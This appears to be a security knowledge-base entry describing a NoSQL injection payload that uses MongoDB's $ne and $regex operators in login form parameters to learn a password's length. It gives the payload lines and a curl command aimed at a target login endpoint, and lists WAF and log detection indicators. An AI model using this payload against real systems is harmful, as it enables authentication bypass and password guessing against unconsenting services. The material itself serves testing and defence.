---
id: 0cc7089f-aa8a-4f78-bb7d-a74c7f3c5cdf
name: NoSQL-Injection-Regex-Payload-for-Password-Length
type: code
language: json
verified: true
created_at: '2023-04-06T03:56:31.447282+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
tags:
  - nosql-injection
  - payload
  - regex
  - mongodb
validated: true
---

# NoSQL-Injection-Regex-Payload-for-Password-Length

## Code

```json
username[$ne]=toto&password[$regex]=.{1}
username[$ne]=toto&password[$regex]=.{3}
```

## Description

This JSON-formatted payload (as URL-encoded query parameters) exploits NoSQL injection in login forms to probe password lengths. The $ne operator on username bypasses equality checks, while $regex on password tests for exact length matches using .{n}. Iterate n to find the password length via response differences. Designed for MongoDB queries vulnerable to operator injection.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| username[$ne] | Known username with $ne to always match (not equal to a dummy) | toto |
| password[$regex] | Regex pattern for length test | .{1}, .{3}, .{8} |

## Usage

Encode as form data in HTTP POST to /login endpoint, e.g., via curl: `curl -d 'username[$ne]=toto&password[$regex]=.{5}' http://target.com/login`. Test lengths 1-20; matching length alters response (e.g., success or unique error). Use in procedures like [[procedures/NoSQL-Injection-Password-Length-Extraction]] to optimize brute force.

## Detection

- WAF logs showing $ne or $regex in POST data.
- Application logs with malformed MongoDB queries containing .{n} patterns.
- Repeated login failures with incremental regex lengths.
- Network monitoring for high-volume POSTs to auth endpoints.

## Related

- [[procedures/NoSQL-Injection-Password-Length-Extraction]]
- [[tools/Burp-Suite]]
